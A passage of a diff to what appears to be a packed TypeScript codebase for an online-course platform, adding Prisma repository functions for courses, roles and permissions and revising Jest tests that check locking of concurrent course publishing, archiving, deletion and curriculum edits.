+400:   const courseIds = rawCourses.map((c) => c.id);
+401:   const lessonCountsByCourse = new Map<string, number>();
+402:   if (courseIds.length > 0) {
+403:     const modules = await prisma.module.findMany({
+404:       where: { courseId: { in: courseIds } },
+405:       select: {
+406:         courseId: true,
+407:         _count: {
+408:           select: { lessons: true },
+409:         },
+410:       },
+411:     });
+412:     for (const mod of modules) {
+413:       const current = lessonCountsByCourse.get(mod.courseId) ?? 0;
+414:       lessonCountsByCourse.set(mod.courseId, current + mod._count.lessons);
+415:     }
+416:   }
+417:   const courses: CatalogCourseRow[] = rawCourses.map((c) => ({
+418:     ...c,
+419:     totalLessons: lessonCountsByCourse.get(c.id) ?? 0,
+420:   }));
+421:   const totalPages = Math.ceil(totalCount / limit) || 1;
+422:   return {
+423:     courses,
+424:     totalCount,
+425:     page,
+426:     limit,
+427:     totalPages,
+428:   };
+429: }
+430: export async function findPublishedCourseCategories(): Promise<string[]> {
+431:   const results = await prisma.course.findMany({
+432:     where: {
+433:       status: CourseStatus.PUBLISHED,
+434:       category: { not: null },
+435:     },
+436:     select: {
+437:       category: true,
+438:     },
+439:     distinct: ["category"],
+440:     orderBy: {
+441:       category: "asc",
+442:     },
+443:   });
+444:   return results
+445:     .map((r) => r.category)
+446:     .filter((cat): cat is string => Boolean(cat?.trim()));
+447: }
+448: export async function updateCourse(
+449:   id: string,
+450:   data: Prisma.CourseUpdateInput,
+451: ): Promise<Course> {
+452:   return prisma.course.update({
+453:     where: { id },
+454:     data,
+455:   });
+456: }
+457: export async function deleteCourseAtomic(courseId: string): Promise<Course> {
+458:   return prisma.$transaction(async (tx) => {
+459:     await lockCourseForUpdate(tx, courseId);
+460:     return tx.course.delete({
+461:       where: { id: courseId },
+462:     });
+463:   });
+464: }
+465: export async function countCurriculumItems(
+466:   courseId: string,
+467:   tx?: Prisma.TransactionClient,
+468: ): Promise<{ moduleCount: number; lessonCount: number }> {
+469:   const client = tx ?? prisma;
+470:   const moduleCount = await client.module.count({
+471:     where: { courseId },
+472:   });
+473:   const lessonCount = await client.lesson.count({
+474:     where: {
+475:       module: { courseId },
+476:     },
+477:   });
+478:   return { moduleCount, lessonCount };
+479: }
+480: export async function executeCourseStatusTransition(
+481:   courseId: string,
+482:   fromStatuses: CourseStatus[],
+483:   toStatus: CourseStatus,
+484:   validator?: (tx: Prisma.TransactionClient) => Promise<void>,
+485: ): Promise<Course> {
+486:   return prisma.$transaction(async (tx) => {
+487:     const course = await lockCourseForUpdate(tx, courseId);
+488:     if (!fromStatuses.includes(course.status)) {
+489:       throw new ValidationError(
+490:         `Cannot transition course from ${course.status} to ${toStatus}`,
+491:       );
+492:     }
+493:     if (validator) {
+494:       await validator(tx);
+495:     }
+496:     return tx.course.update({
+497:       where: { id: courseId },
+498:       data: { status: toStatus },
+499:     });
+500:   });
+501: }
 `````
 
 ## File: src/repositories/enrollment.ts
@@ -17551,6 +19182,111 @@ tsconfig.json
 188: }
 `````
 
+## File: src/repositories/permission.ts
+`````typescript
+ 1: import { prisma } from "@/lib/db";
+ 2: import type { Prisma } from "@prisma/client";
+ 3: export async function findPermissionByName(name: string) {
+ 4:   return prisma.permission.findUnique({ where: { name } });
+ 5: }
+ 6: export async function findPermissionById(id: string) {
+ 7:   return prisma.permission.findUnique({ where: { id } });
+ 8: }
+ 9: export async function createPermission(data: Prisma.PermissionCreateInput) {
+10:   return prisma.permission.create({ data });
+11: }
+12: export async function deletePermission(id: string) {
+13:   return prisma.permission.delete({ where: { id } });
+14: }
+15: export async function findAllPermissions() {
+16:   return prisma.permission.findMany();
+17: }
+`````
+
+## File: src/repositories/role-permission.ts
+`````typescript
+ 1: import { prisma } from "@/lib/db";
+ 2: export async function assignPermissionToRole(
+ 3:   roleId: string,
+ 4:   permissionId: string,
+ 5: ) {
+ 6:   return prisma.rolePermission.create({
+ 7:     data: { roleId, permissionId },
+ 8:   });
+ 9: }
+10: export async function removePermissionFromRole(
+11:   roleId: string,
+12:   permissionId: string,
+13: ) {
+14:   return prisma.rolePermission.delete({
+15:     where: { roleId_permissionId: { roleId, permissionId } },
+16:   });
+17: }
+18: export async function findRolePermission(roleId: string, permissionId: string) {
+19:   return prisma.rolePermission.findUnique({
+20:     where: { roleId_permissionId: { roleId, permissionId } },
+21:   });
+22: }
+`````
+
+## File: src/repositories/role.ts
+`````typescript
+ 1: import { prisma } from "@/lib/db";
+ 2: import type { Prisma } from "@prisma/client";
+ 3: export async function findRoleByName(name: string) {
+ 4:   return prisma.role.findUnique({ where: { name } });
+ 5: }
+ 6: export async function findRoleById(id: string) {
+ 7:   return prisma.role.findUnique({
+ 8:     where: { id },
+ 9:     include: {
+10:       rolePermissions: {
+11:         include: { permission: true },
+12:       },
+13:     },
+14:   });
+15: }
+16: export async function createRole(data: Prisma.RoleCreateInput) {
+17:   return prisma.role.create({ data });
+18: }
+19: export async function deleteRole(id: string) {
+20:   return prisma.role.delete({ where: { id } });
+21: }
+22: export async function findAllRoles() {
+23:   return prisma.role.findMany({
+24:     include: {
+25:       _count: { select: { userRoles: true } },
+26:     },
+27:   });
+28: }
+`````
+
+## File: src/repositories/user-role.ts
+`````typescript
+ 1: import { prisma } from "@/lib/db";
+ 2: export async function assignRoleToUser(userId: string, roleId: string) {
+ 3:   return prisma.userRole.create({
+ 4:     data: { userId, roleId },
+ 5:   });
+ 6: }
+ 7: export async function removeRoleFromUser(userId: string, roleId: string) {
+ 8:   return prisma.userRole.delete({
+ 9:     where: { userId_roleId: { userId, roleId } },
+10:   });
+11: }
+12: export async function findUserRole(userId: string, roleId: string) {
+13:   return prisma.userRole.findUnique({
+14:     where: { userId_roleId: { userId, roleId } },
+15:   });
+16: }
+17: export async function findUserRoles(userId: string) {
+18:   return prisma.userRole.findMany({
+19:     where: { userId },
+20:     include: { role: true },
+21:   });
+22: }
+`````
+
 ## File: src/services/__tests__/authorization-roles.test.ts
 `````typescript
   1: import * as authorizationService from "../authorization";
@@ -17892,8 +19628,8 @@ tsconfig.json
  16:     });
  17:   }
  18:   private release() {
- 19:     if (this.queue.length > 0) {
- 20:       const next = this.queue.shift()!;
+ 19:     const next = this.queue.shift();
+ 20:     if (next) {
  21:       next();
  22:     } else {
  23:       this.locked = false;
@@ -17927,364 +19663,371 @@ tsconfig.json
  51:     courseLocks.clear();
  52:     db = new Map();
  53:   });
- 54:   async function lockCourseForUpdate(courseId: string) {
- 55:     const release = await getCourseLock(courseId).acquire();
- 56:     const course = db.get(courseId);
- 57:     if (!course) {
- 58:       release();
- 59:       throw new NotFoundError("Course not found");
- 60:     }
- 61:     return { course, release };
- 62:   }
- 63:   async function simulateCreateModule(
- 64:     courseId: string,
- 65:     title: string,
- 66:     delayMs = 10,
- 67:   ) {
- 68:     const { course, release } = await lockCourseForUpdate(courseId);
- 69:     try {
- 70:       if (course.status !== CourseStatus.DRAFT) {
- 71:         throw new ValidationError(
- 72:           "Cannot modify curriculum of a published or archived course",
- 73:         );
- 74:       }
- 75:       await new Promise((resolve) => setTimeout(resolve, delayMs));
- 76:       const newIndex = course.modules.length;
- 77:       const newModule = {
- 78:         id: `mod-${Date.now()}-${Math.random().toString(36).slice(2, 5)}`,
- 79:         orderIndex: newIndex,
- 80:         title,
- 81:       };
- 82:       course.modules.push(newModule);
- 83:       return newModule;
- 84:     } finally {
- 85:       release();
- 86:     }
- 87:   }
- 88:   async function simulateCreateLesson(
- 89:     courseId: string,
- 90:     moduleId: string,
- 91:     title: string,
- 92:     delayMs = 10,
- 93:   ) {
- 94:     const { course, release } = await lockCourseForUpdate(courseId);
- 95:     try {
- 96:       if (course.status !== CourseStatus.DRAFT) {
- 97:         throw new ValidationError(
- 98:           "Cannot modify curriculum of a published or archived course",
- 99:         );
-100:       }
-101:       await new Promise((resolve) => setTimeout(resolve, delayMs));
-102:       const moduleLessons = course.lessons.filter(
-103:         (l) => l.moduleId === moduleId,
-104:       );
-105:       const newIndex = moduleLessons.length;
-106:       const newLesson = {
-107:         id: `les-${Date.now()}-${Math.random().toString(36).slice(2, 5)}`,
-108:         moduleId,
-109:         orderIndex: newIndex,
-110:         title,
-111:       };
-112:       course.lessons.push(newLesson);
-113:       return newLesson;
-114:     } finally {
-115:       release();
-116:     }
-117:   }
-118:   async function simulateReorderModules(
-119:     courseId: string,
-120:     orderedIds: string[],
-121:     delayMs = 10,
-122:   ) {
-123:     const { course, release } = await lockCourseForUpdate(courseId);
-124:     try {
-125:       if (course.status !== CourseStatus.DRAFT) {
-126:         throw new ValidationError(
-127:           "Cannot modify curriculum of a published or archived course",
-128:         );
-129:       }
-130:       await new Promise((resolve) => setTimeout(resolve, delayMs));
-131:       const currentIds = new Set(course.modules.map((m) => m.id));
-132:       if (orderedIds.length !== course.modules.length) {
-133:         throw new ValidationError("Permutation count mismatch");
-134:       }
-135:       if (!orderedIds.every((id) => currentIds.has(id))) {
-136:         throw new ValidationError("Foreign or missing IDs in permutation");
-137:       }
-138:       course.modules.sort(
-139:         (a, b) => orderedIds.indexOf(a.id) - orderedIds.indexOf(b.id),
-140:       );
-141:       course.modules.forEach((m, idx) => {
-142:         m.orderIndex = idx;
-143:       });
-144:       return course.modules;
-145:     } finally {
-146:       release();
-147:     }
-148:   }
-149:   async function simulatePublishCourse(courseId: string, delayMs = 10) {
-150:     const { course, release } = await lockCourseForUpdate(courseId);
-151:     try {
-152:       if (course.status !== CourseStatus.DRAFT) {
-153:         throw new ValidationError(
-154:           `Cannot transition course from ${course.status} to PUBLISHED`,
-155:         );
-156:       }
-157:       await new Promise((resolve) => setTimeout(resolve, delayMs));
-158:       if (course.modules.length < 1) {
-159:         throw new ValidationError(
-160:           "Cannot publish course without at least one module",
-161:         );
-162:       }
-163:       if (course.lessons.length < 1) {
-164:         throw new ValidationError(
-165:           "Cannot publish course without at least one lesson",
-166:         );
-167:       }
-168:       course.status = CourseStatus.PUBLISHED;
-169:       return course;
-170:     } finally {
-171:       release();
-172:     }
-173:   }
-174:   async function simulateArchiveCourse(courseId: string, delayMs = 10) {
-175:     const { course, release } = await lockCourseForUpdate(courseId);
-176:     try {
-177:       if (
-178:         course.status !== CourseStatus.DRAFT &&
-179:         course.status !== CourseStatus.PUBLISHED
-180:       ) {
-181:         throw new ValidationError(
-182:           `Cannot transition course from ${course.status} to ARCHIVED`,
-183:         );
-184:       }
-185:       await new Promise((resolve) => setTimeout(resolve, delayMs));
-186:       course.status = CourseStatus.ARCHIVED;
-187:       return course;
-188:     } finally {
-189:       release();
-190:     }
-191:   }
-192:   async function simulateDeleteCourse(courseId: string, delayMs = 10) {
-193:     const { course, release } = await lockCourseForUpdate(courseId);
-194:     try {
-195:       await new Promise((resolve) => setTimeout(resolve, delayMs));
-196:       db.delete(courseId);
-197:       return course;
-198:     } finally {
-199:       release();
-200:     }
-201:   }
-202:   describe("1. Concurrent publishCourse + createModule", () => {
-203:     it("never permits a course to end up PUBLISHED with a module created after the moment of publication", async () => {
-204:       const courseId = "course-test-1";
-205:       db.set(courseId, {
-206:         id: courseId,
-207:         status: CourseStatus.DRAFT,
-208:         instructorId: "inst-1",
-209:         modules: [{ id: "mod-1", orderIndex: 0, title: "Module 1" }],
-210:         lessons: [
-211:           {
-212:             id: "les-1",
-213:             moduleId: "mod-1",
-214:             orderIndex: 0,
-215:             title: "Lesson 1",
-216:           },
-217:         ],
-218:       });
-219:       const results = await Promise.allSettled([
-220:         simulatePublishCourse(courseId, 15),
-221:         simulateCreateModule(courseId, "Late Arrival Module", 15),
-222:       ]);
-223:       const course = db.get(courseId)!;
-224:       expect(course.status).toBe(CourseStatus.PUBLISHED);
-225:       const publishResult = results[0];
-226:       const createResult = results[1];
-227:       if (
-228:         publishResult.status === "fulfilled" &&
-229:         createResult.status === "rejected"
-230:       ) {
-231:         expect(createResult.reason).toBeInstanceOf(ValidationError);
-232:         expect(course.modules).toHaveLength(1);
-233:         expect(course.modules[0].title).toBe("Module 1");
-234:       } else if (
+ 54:   function getDbCourse(id: string): DbCourse {
+ 55:     const course = db.get(id);
+ 56:     if (!course) {
+ 57:       throw new Error(`Course ${id} not found in test DB`);
+ 58:     }
+ 59:     return course;
+ 60:   }
+ 61:   async function lockCourseForUpdate(courseId: string) {
+ 62:     const release = await getCourseLock(courseId).acquire();
+ 63:     const course = db.get(courseId);
+ 64:     if (!course) {
+ 65:       release();
+ 66:       throw new NotFoundError("Course not found");
+ 67:     }
+ 68:     return { course, release };
+ 69:   }
+ 70:   async function simulateCreateModule(
+ 71:     courseId: string,
+ 72:     title: string,
+ 73:     delayMs = 10,
+ 74:   ) {
+ 75:     const { course, release } = await lockCourseForUpdate(courseId);
+ 76:     try {
+ 77:       if (course.status !== CourseStatus.DRAFT) {
+ 78:         throw new ValidationError(
+ 79:           "Cannot modify curriculum of a published or archived course",
+ 80:         );
+ 81:       }
+ 82:       await new Promise((resolve) => setTimeout(resolve, delayMs));
+ 83:       const newIndex = course.modules.length;
+ 84:       const newModule = {
+ 85:         id: `mod-${Date.now()}-${Math.random().toString(36).slice(2, 5)}`,
+ 86:         orderIndex: newIndex,
+ 87:         title,
+ 88:       };
+ 89:       course.modules.push(newModule);
+ 90:       return newModule;
+ 91:     } finally {
+ 92:       release();
+ 93:     }
+ 94:   }
+ 95:   async function simulateCreateLesson(
+ 96:     courseId: string,
+ 97:     moduleId: string,
+ 98:     title: string,
+ 99:     delayMs = 10,
+100:   ) {
+101:     const { course, release } = await lockCourseForUpdate(courseId);
+102:     try {
+103:       if (course.status !== CourseStatus.DRAFT) {
+104:         throw new ValidationError(
+105:           "Cannot modify curriculum of a published or archived course",
+106:         );
+107:       }
+108:       await new Promise((resolve) => setTimeout(resolve, delayMs));
+109:       const moduleLessons = course.lessons.filter(
+110:         (l) => l.moduleId === moduleId,
+111:       );
+112:       const newIndex = moduleLessons.length;
+113:       const newLesson = {
+114:         id: `les-${Date.now()}-${Math.random().toString(36).slice(2, 5)}`,
+115:         moduleId,
+116:         orderIndex: newIndex,
+117:         title,
+118:       };
+119:       course.lessons.push(newLesson);
+120:       return newLesson;
+121:     } finally {
+122:       release();
+123:     }
+124:   }
+125:   async function simulateReorderModules(
+126:     courseId: string,
+127:     orderedIds: string[],
+128:     delayMs = 10,
+129:   ) {
+130:     const { course, release } = await lockCourseForUpdate(courseId);
+131:     try {
+132:       if (course.status !== CourseStatus.DRAFT) {
+133:         throw new ValidationError(
+134:           "Cannot modify curriculum of a published or archived course",
+135:         );
+136:       }
+137:       await new Promise((resolve) => setTimeout(resolve, delayMs));
+138:       const currentIds = new Set(course.modules.map((m) => m.id));
+139:       if (orderedIds.length !== course.modules.length) {
+140:         throw new ValidationError("Permutation count mismatch");
+141:       }
+142:       if (!orderedIds.every((id) => currentIds.has(id))) {
+143:         throw new ValidationError("Foreign or missing IDs in permutation");
+144:       }
+145:       course.modules.sort(
+146:         (a, b) => orderedIds.indexOf(a.id) - orderedIds.indexOf(b.id),
+147:       );
+148:       course.modules.forEach((m, idx) => {
+149:         m.orderIndex = idx;
+150:       });
+151:       return course.modules;
+152:     } finally {
+153:       release();
+154:     }
+155:   }
+156:   async function simulatePublishCourse(courseId: string, delayMs = 10) {
+157:     const { course, release } = await lockCourseForUpdate(courseId);
+158:     try {
+159:       if (course.status !== CourseStatus.DRAFT) {
+160:         throw new ValidationError(
+161:           `Cannot transition course from ${course.status} to PUBLISHED`,
+162:         );
+163:       }
+164:       await new Promise((resolve) => setTimeout(resolve, delayMs));
+165:       if (course.modules.length < 1) {
+166:         throw new ValidationError(
+167:           "Cannot publish course without at least one module",
+168:         );
+169:       }
+170:       if (course.lessons.length < 1) {
+171:         throw new ValidationError(
+172:           "Cannot publish course without at least one lesson",
+173:         );
+174:       }
+175:       course.status = CourseStatus.PUBLISHED;
+176:       return course;
+177:     } finally {
+178:       release();
+179:     }
+180:   }
+181:   async function simulateArchiveCourse(courseId: string, delayMs = 10) {
+182:     const { course, release } = await lockCourseForUpdate(courseId);
+183:     try {
+184:       if (
+185:         course.status !== CourseStatus.DRAFT &&
+186:         course.status !== CourseStatus.PUBLISHED
+187:       ) {
+188:         throw new ValidationError(
+189:           `Cannot transition course from ${course.status} to ARCHIVED`,
+190:         );
+191:       }
+192:       await new Promise((resolve) => setTimeout(resolve, delayMs));
+193:       course.status = CourseStatus.ARCHIVED;
+194:       return course;
+195:     } finally {
+196:       release();
+197:     }
+198:   }
+199:   async function simulateDeleteCourse(courseId: string, delayMs = 10) {
+200:     const { course, release } = await lockCourseForUpdate(courseId);
+201:     try {
+202:       await new Promise((resolve) => setTimeout(resolve, delayMs));
+203:       db.delete(courseId);
+204:       return course;
+205:     } finally {
+206:       release();
+207:     }
+208:   }
+209:   describe("1. Concurrent publishCourse + createModule", () => {
+210:     it("never permits a course to end up PUBLISHED with a module created after the moment of publication", async () => {
+211:       const courseId = "course-test-1";
+212:       db.set(courseId, {
+213:         id: courseId,
+214:         status: CourseStatus.DRAFT,
+215:         instructorId: "inst-1",
+216:         modules: [{ id: "mod-1", orderIndex: 0, title: "Module 1" }],
+217:         lessons: [
+218:           {
+219:             id: "les-1",
+220:             moduleId: "mod-1",
+221:             orderIndex: 0,
+222:             title: "Lesson 1",
+223:           },
+224:         ],
+225:       });
+226:       const results = await Promise.allSettled([
+227:         simulatePublishCourse(courseId, 15),
+228:         simulateCreateModule(courseId, "Late Arrival Module", 15),
+229:       ]);
+230:       const course = getDbCourse(courseId);
+231:       expect(course.status).toBe(CourseStatus.PUBLISHED);
+232:       const publishResult = results[0];
+233:       const createResult = results[1];
+234:       if (
 235:         publishResult.status === "fulfilled" &&
-236:         createResult.status === "fulfilled"
+236:         createResult.status === "rejected"
 237:       ) {
-238:         expect(course.modules).toHaveLength(2);
-239:       } else {
-240:         fail("Invalid concurrency state reached");
-241:       }
-242:     });
-243:   });
-244:   describe("2. Concurrent publishCourse + createLesson", () => {
-245:     it("never permits a lesson mutation to commit after the publication state is sealed", async () => {
-246:       const courseId = "course-test-2";
-247:       db.set(courseId, {
-248:         id: courseId,
-249:         status: CourseStatus.DRAFT,
-250:         instructorId: "inst-1",
-251:         modules: [{ id: "mod-1", orderIndex: 0, title: "Module 1" }],
-252:         lessons: [
-253:           {
-254:             id: "les-1",
-255:             moduleId: "mod-1",
-256:             orderIndex: 0,
-257:             title: "Lesson 1",
-258:           },
-259:         ],
-260:       });
-261:       const results = await Promise.allSettled([
-262:         simulatePublishCourse(courseId, 20),
-263:         simulateCreateLesson(courseId, "mod-1", "Late Lesson", 10),
-264:       ]);
-265:       const course = db.get(courseId)!;
-266:       expect(course.status).toBe(CourseStatus.PUBLISHED);
-267:       const publishResult = results[0];
-268:       const lessonResult = results[1];
-269:       if (
-270:         publishResult.status === "fulfilled" &&
-271:         lessonResult.status === "rejected"
-272:       ) {
-273:         expect(lessonResult.reason).toBeInstanceOf(ValidationError);
-274:         expect(course.lessons).toHaveLength(1);
-275:       } else {
-276:         expect(course.lessons).toHaveLength(2);
-277:       }
-278:     });
-279:   });
-280:   describe("3. Concurrent archiveCourse + curriculum mutation", () => {
-281:     it("completely rejects curriculum mutations once ARCHIVED is committed", async () => {
-282:       const courseId = "course-test-3";
-283:       db.set(courseId, {
-284:         id: courseId,
-285:         status: CourseStatus.PUBLISHED,
-286:         instructorId: "inst-1",
-287:         modules: [{ id: "mod-1", orderIndex: 0, title: "Module 1" }],
-288:         lessons: [
-289:           {
-290:             id: "les-1",
-291:             moduleId: "mod-1",
-292:             orderIndex: 0,
-293:             title: "Lesson 1",
-294:           },
-295:         ],
-296:       });
-297:       const results = await Promise.allSettled([
-298:         simulateArchiveCourse(courseId, 10),
-299:         simulateCreateModule(courseId, "Module After Archive", 20),
-300:       ]);
-301:       const course = db.get(courseId)!;
-302:       expect(course.status).toBe(CourseStatus.ARCHIVED);
-303:       const archiveResult = results[0];
-304:       const createResult = results[1];
-305:       expect(archiveResult.status).toBe("fulfilled");
-306:       expect(createResult.status).toBe("rejected");
-307:       expect((createResult as PromiseRejectedResult).reason).toBeInstanceOf(
-308:         ValidationError,
-309:       );
-310:       expect(course.modules).toHaveLength(1);
-311:     });
-312:   });
-313:   describe("4. Concurrent curriculum mutation + publish ordering with invalid prerequisites", () => {
-314:     it("guarantees publish fails if prerequisites are not met, preventing invalid published states", async () => {
-315:       const courseId = "course-test-4";
-316:       db.set(courseId, {
-317:         id: courseId,
-318:         status: CourseStatus.DRAFT,
-319:         instructorId: "inst-1",
-320:         modules: [],
-321:         lessons: [],
-322:       });
-323:       const results = await Promise.allSettled([
-324:         simulatePublishCourse(courseId, 15),
-325:         simulateCreateModule(courseId, "First Module", 15),
-326:       ]);
-327:       const course = db.get(courseId)!;
-328:       const publishResult = results[0];
-329:       expect(publishResult.status).toBe("rejected");
-330:       expect((publishResult as PromiseRejectedResult).reason).toBeInstanceOf(
-331:         ValidationError,
-332:       );
-333:       expect(course.status).toBe(CourseStatus.DRAFT);
-334:     });
-335:   });
-336:   describe("5. Final Database State Invariant (PUBLISHED / ARCHIVED => zero curriculum mutations)", () => {
-337:     it("guarantees all 8 curriculum mutations are unconditionally rejected when course is PUBLISHED or ARCHIVED", async () => {
-338:       for (const lockedStatus of [
-339:         CourseStatus.PUBLISHED,
-340:         CourseStatus.ARCHIVED,
-341:       ]) {
-342:         const courseId = `course-locked-${lockedStatus}`;
-343:         db.set(courseId, {
-344:           id: courseId,
-345:           status: lockedStatus,
-346:           instructorId: "inst-1",
-347:           modules: [{ id: "mod-1", orderIndex: 0, title: "Module 1" }],
-348:           lessons: [
-349:             {
-350:               id: "les-1",
-351:               moduleId: "mod-1",
-352:               orderIndex: 0,
-353:               title: "Lesson 1",
-354:             },
-355:           ],
-356:         });
-357:         await expect(
-358:           simulateCreateModule(courseId, "Forbidden Module"),
-359:         ).rejects.toThrow(ValidationError);
-360:         await expect(
-361:           simulateCreateLesson(courseId, "mod-1", "Forbidden Lesson"),
-362:         ).rejects.toThrow(ValidationError);
-363:         await expect(
-364:           simulateReorderModules(courseId, ["mod-1"]),
-365:         ).rejects.toThrow(ValidationError);
-366:         const course = db.get(courseId)!;
-367:         expect(course.modules).toHaveLength(1);
-368:         expect(course.lessons).toHaveLength(1);
-369:       }
-370:     });
-371:   });
-372:   describe("6. Concurrent deleteCourse + curriculum mutation", () => {
-373:     it("serializes deleteCourse with curriculum mutations, preventing orphaned records", async () => {
-374:       const courseId = "course-test-6";
-375:       db.set(courseId, {
-376:         id: courseId,
-377:         status: CourseStatus.DRAFT,
-378:         instructorId: "inst-1",
-379:         modules: [{ id: "mod-1", orderIndex: 0, title: "Module 1" }],
-380:         lessons: [
-381:           {
-382:             id: "les-1",
-383:             moduleId: "mod-1",
-384:             orderIndex: 0,
-385:             title: "Lesson 1",
-386:           },
-387:         ],
-388:       });
-389:       const results = await Promise.allSettled([
-390:         simulateDeleteCourse(courseId, 15),
-391:         simulateCreateModule(courseId, "Dangling Module", 15),
-392:       ]);
-393:       const deleteResult = results[0];
-394:       const createResult = results[1];
-395:       if (
-396:         deleteResult.status === "fulfilled" &&
-397:         createResult.status === "rejected"
-398:       ) {
-399:         expect((createResult as PromiseRejectedResult).reason).toBeInstanceOf(
-400:           NotFoundError,
-401:         );
-402:         expect(db.has(courseId)).toBe(false);
-403:       } else if (
-404:         deleteResult.status === "fulfilled" &&
-405:         createResult.status === "fulfilled"
-406:       ) {
-407:         expect(db.has(courseId)).toBe(false);
-408:       }
-409:     });
-410:   });
-411: });
+238:         expect(createResult.reason).toBeInstanceOf(ValidationError);
+239:         expect(course.modules).toHaveLength(1);
+240:         expect(course.modules[0].title).toBe("Module 1");
+241:       } else if (
+242:         publishResult.status === "fulfilled" &&
+243:         createResult.status === "fulfilled"
+244:       ) {
+245:         expect(course.modules).toHaveLength(2);
+246:       } else {
+247:         fail("Invalid concurrency state reached");
+248:       }
+249:     });
+250:   });
+251:   describe("2. Concurrent publishCourse + createLesson", () => {
+252:     it("never permits a lesson mutation to commit after the publication state is sealed", async () => {
+253:       const courseId = "course-test-2";
+254:       db.set(courseId, {
+255:         id: courseId,
+256:         status: CourseStatus.DRAFT,
+257:         instructorId: "inst-1",
+258:         modules: [{ id: "mod-1", orderIndex: 0, title: "Module 1" }],
+259:         lessons: [
+260:           {
+261:             id: "les-1",
+262:             moduleId: "mod-1",
+263:             orderIndex: 0,
+264:             title: "Lesson 1",
+265:           },
+266:         ],
+267:       });
+268:       const results = await Promise.allSettled([
+269:         simulatePublishCourse(courseId, 20),
+270:         simulateCreateLesson(courseId, "mod-1", "Late Lesson", 10),
+271:       ]);
+272:       const course = getDbCourse(courseId);
+273:       expect(course.status).toBe(CourseStatus.PUBLISHED);
+274:       const publishResult = results[0];
+275:       const lessonResult = results[1];
+276:       if (
+277:         publishResult.status === "fulfilled" &&
+278:         lessonResult.status === "rejected"
+279:       ) {
+280:         expect(lessonResult.reason).toBeInstanceOf(ValidationError);
+281:         expect(course.lessons).toHaveLength(1);
+282:       } else {
+283:         expect(course.lessons).toHaveLength(2);
+284:       }
+285:     });
+286:   });
+287:   describe("3. Concurrent archiveCourse + curriculum mutation", () => {
+288:     it("completely rejects curriculum mutations once ARCHIVED is committed", async () => {
+289:       const courseId = "course-test-3";
+290:       db.set(courseId, {
+291:         id: courseId,
+292:         status: CourseStatus.PUBLISHED,
+293:         instructorId: "inst-1",
+294:         modules: [{ id: "mod-1", orderIndex: 0, title: "Module 1" }],
+295:         lessons: [
+296:           {
+297:             id: "les-1",
+298:             moduleId: "mod-1",
+299:             orderIndex: 0,
+300:             title: "Lesson 1",
+301:           },
+302:         ],
+303:       });
+304:       const results = await Promise.allSettled([
+305:         simulateArchiveCourse(courseId, 10),
+306:         simulateCreateModule(courseId, "Module After Archive", 20),
+307:       ]);
+308:       const course = getDbCourse(courseId);
+309:       expect(course.status).toBe(CourseStatus.ARCHIVED);
+310:       const archiveResult = results[0];
+311:       const createResult = results[1];
+312:       expect(archiveResult.status).toBe("fulfilled");
+313:       expect(createResult.status).toBe("rejected");
+314:       expect((createResult as PromiseRejectedResult).reason).toBeInstanceOf(
+315:         ValidationError,
+316:       );
+317:       expect(course.modules).toHaveLength(1);
+318:     });
+319:   });
+320:   describe("4. Concurrent curriculum mutation + publish ordering with invalid prerequisites", () => {
+321:     it("guarantees publish fails if prerequisites are not met, preventing invalid published states", async () => {
+322:       const courseId = "course-test-4";
+323:       db.set(courseId, {
+324:         id: courseId,
+325:         status: CourseStatus.DRAFT,
+326:         instructorId: "inst-1",
+327:         modules: [],
+328:         lessons: [],
+329:       });
+330:       const results = await Promise.allSettled([
+331:         simulatePublishCourse(courseId, 15),
+332:         simulateCreateModule(courseId, "First Module", 15),
+333:       ]);
+334:       const course = getDbCourse(courseId);
+335:       const publishResult = results[0];
+336:       expect(publishResult.status).toBe("rejected");
+337:       expect((publishResult as PromiseRejectedResult).reason).toBeInstanceOf(
+338:         ValidationError,
+339:       );
+340:       expect(course.status).toBe(CourseStatus.DRAFT);
+341:     });
+342:   });
+343:   describe("5. Final Database State Invariant (PUBLISHED / ARCHIVED => zero curriculum mutations)", () => {
+344:     it("guarantees all 8 curriculum mutations are unconditionally rejected when course is PUBLISHED or ARCHIVED", async () => {
+345:       for (const lockedStatus of [
+346:         CourseStatus.PUBLISHED,
+347:         CourseStatus.ARCHIVED,
+348:       ]) {
+349:         const courseId = `course-locked-${lockedStatus}`;
+350:         db.set(courseId, {
+351:           id: courseId,
+352:           status: lockedStatus,
+353:           instructorId: "inst-1",
+354:           modules: [{ id: "mod-1", orderIndex: 0, title: "Module 1" }],
+355:           lessons: [
+356:             {
+357:               id: "les-1",
+358:               moduleId: "mod-1",
+359:               orderIndex: 0,
+360:               title: "Lesson 1",
+361:             },
+362:           ],
+363:         });
+364:         await expect(
+365:           simulateCreateModule(courseId, "Forbidden Module"),
+366:         ).rejects.toThrow(ValidationError);
+367:         await expect(
+368:           simulateCreateLesson(courseId, "mod-1", "Forbidden Lesson"),
+369:         ).rejects.toThrow(ValidationError);
+370:         await expect(
+371:           simulateReorderModules(courseId, ["mod-1"]),
+372:         ).rejects.toThrow(ValidationError);
+373:         const course = getDbCourse(courseId);
+374:         expect(course.modules).toHaveLength(1);
+375:         expect(course.lessons).toHaveLength(1);
+376:       }
+377:     });
+378:   });
+379:   describe("6. Concurrent deleteCourse + curriculum mutation", () => {
+380:     it("serializes deleteCourse with curriculum mutations, preventing orphaned records", async () => {
+381:       const courseId = "course-test-6";
+382:       db.set(courseId, {
+383:         id: courseId,
+384:         status: CourseStatus.DRAFT,
+385:         instructorId: "inst-1",
+386:         modules: [{ id: "mod-1", orderIndex: 0, title: "Module 1" }],
+387:         lessons: [
+388:           {
+389:             id: "les-1",
+390:             moduleId: "mod-1",
+391:             orderIndex: 0,
+392:             title: "Lesson 1",
+393:           },
+394:         ],
+395:       });
+396:       const results = await Promise.allSettled([
+397:         simulateDeleteCourse(courseId, 15),
+398:         simulateCreateModule(courseId, "Dangling Module", 15),
+399:       ]);
+400:       const deleteResult = results[0];
+401:       const createResult = results[1];
+402:       if (
+403:         deleteResult.status === "fulfilled" &&
+404:         createResult.status === "rejected"
+405:       ) {
+406:         expect((createResult as PromiseRejectedResult).reason).toBeInstanceOf(
+407:           NotFoundError,
+408:         );
+409:         expect(db.has(courseId)).toBe(false);
+410:       } else if (
+411:         deleteResult.status === "fulfilled" &&
+412:         createResult.status === "fulfilled"
+413:       ) {
+414:         expect(db.has(courseId)).toBe(false);
+415:       }
+416:     });
+417:   });
+418: });
 `````
 
 ## File: src/services/__tests__/course.test.ts
@@ -19674,330 +21417,408 @@ tsconfig.json
 `````typescript
   1: import { getLessonNavigation } from "../lesson-content";
   2: import * as courseRepository from "@/repositories/course";
-  3: import { NotFoundError } from "@/lib/errors";
